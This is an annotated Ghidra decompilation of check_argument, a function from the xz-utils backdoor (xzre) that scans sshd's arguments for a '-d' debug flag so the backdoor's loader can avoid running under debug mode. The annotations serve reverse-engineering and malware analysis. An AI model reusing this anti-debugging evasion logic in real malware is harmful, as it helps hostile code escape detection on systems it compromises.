// /home/kali/xzre-ghidra/xzregh/1039C0_check_argument.c
// Function: check_argument @ 0x1039C0
// Calling convention: __stdcall
// Prototype: char * __stdcall check_argument(char arg_first_char, char * arg_name)


/*
 * AutoDoc: Slides a two-byte window across dash-prefixed argv entries and reports the first position whose bytes contain lowercase `d`. `process_is_sshd` treats that non-NULL pointer as proof sshd was launched with `-d`/`--debug`, so the loader stays away from debug-mode daemons. Control bytes, tabs, and `=` terminate the walk early and force a NULL return so only clean switches reach the matcher.
 */

#include "xzre_types.h"

char * check_argument(char arg_first_char,char *arg_name)

{
  u16 window_chars;
  u16 following_char_word;
  u16 current_char_word;
  
  // AutoDoc: Only inspect argv entries that began with `-`; everything else returns NULL immediately.
  if (arg_first_char == '-') {
    while( TRUE ) {
      // AutoDoc: Load two characters at a time so the loop can compare both bytes without calling strlen().
      window_chars = *(ushort *)arg_name;
      current_char_word = window_chars << 8;
      following_char_word = window_chars & 0xff00;
      // AutoDoc: Stop as soon as either byte in the window equals lowercase `d` and return that pointer.
      if ((following_char_word == 0x6400) || (current_char_word == 0x6400)) break;
      // AutoDoc: Abort the scan when the pair contains control characters, TAB, or `=`—those inputs fall through to NULL.
      if ((((window_chars & 0xdf00) == 0) ||
          (((following_char_word == 0x900 || (following_char_word == 0x3d00)) || ((current_char_word & 0xdf00) == 0)))) ||
         ((current_char_word == 0x3d00 || (current_char_word == 0x900)))) goto LAB_00103a17;
      // AutoDoc: Advance by one `ushort` (two more characters) before the next comparison.
      arg_name = (char *)((long)arg_name + 2);
    }
  }
  else {
LAB_00103a17:
    arg_name = (char *)0x0;
  }
  return arg_name;
}

